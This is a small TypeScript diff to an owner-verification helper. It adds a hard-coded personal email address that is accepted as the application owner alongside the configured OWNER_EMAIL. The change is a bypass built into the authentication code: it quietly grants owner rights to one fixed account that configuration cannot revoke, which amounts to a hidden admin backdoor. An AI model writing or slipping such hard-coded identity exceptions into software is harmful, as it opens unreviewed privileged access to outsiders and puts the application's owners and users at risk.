@@ -1063,7 +1063,11 @@ export function setOwnerAuthenticated(auth: boolean, uid?: string): void {
  * Verify owner email helper
  */
 export function verifyOwnerEmail(email: string): boolean {
-  return email.trim().toLowerCase() === OWNER_EMAIL.toLowerCase();
+  const normalized = email.trim().toLowerCase();
+  return (
+    normalized === 'festusjohnson445@gmail.com' ||
+    normalized === OWNER_EMAIL.toLowerCase()
+  );
 }
 
 /**
